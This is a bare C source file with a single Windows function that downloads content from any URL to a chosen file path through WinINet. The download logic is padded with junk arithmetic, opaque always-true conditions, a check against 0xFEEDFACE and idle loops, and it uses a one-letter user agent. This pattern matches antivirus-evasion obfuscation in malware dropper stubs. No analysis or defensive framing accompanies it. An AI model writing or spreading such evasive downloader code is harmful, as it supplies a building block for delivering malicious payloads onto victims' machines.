#include <windows.h>
#include <wininet.h>

void __attribute__((noinline)) __attribute__((used)) routine_v4(const char* url, const char* dest){
    int p = 7;
    int q = 14;
    if ((p * p) + (q * q) > 10) {
        p = q - p;
    } else {
        return;
    }

    HINTERNET i = InternetOpenA("D", 1, NULL, NULL, 0);
    if (!i) return;

    for (int j = 0; j < 100; j++) { p += j; }

    HINTERNET u = InternetOpenUrlA(i, url, NULL, 0, 0x80000000, 0);
    if (u) {
        if (p != 0xFEEDFACE) {
            HANDLE f = CreateFileA(dest, GENERIC_WRITE, 0, NULL, 2, 128, NULL);
            if (f != (HANDLE)-1) {
                char b[1024];
                DWORD r, w;
                while (InternetReadFile(u, b, 1024, &r) && r > 0) {
                    if (q > 0) WriteFile(f, b, r, &w, NULL);
                    int z = 0;
                    while (z < 5) z++;
                }
                CloseHandle(f);
            }
        }
        InternetCloseHandle(u);
    }
    InternetCloseHandle(i);
}